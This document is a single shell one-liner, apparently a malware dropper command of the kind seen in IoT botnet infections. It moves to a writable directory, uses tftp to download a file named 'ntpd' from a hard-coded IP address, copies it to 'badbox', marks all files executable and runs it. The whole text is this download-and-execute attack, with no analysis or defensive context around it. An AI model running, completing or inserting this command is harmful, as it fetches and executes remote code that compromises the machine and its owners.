cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 162.243.138.103 -c get ntpd;cat ntpd >badbox;chmod +x *;./badbox
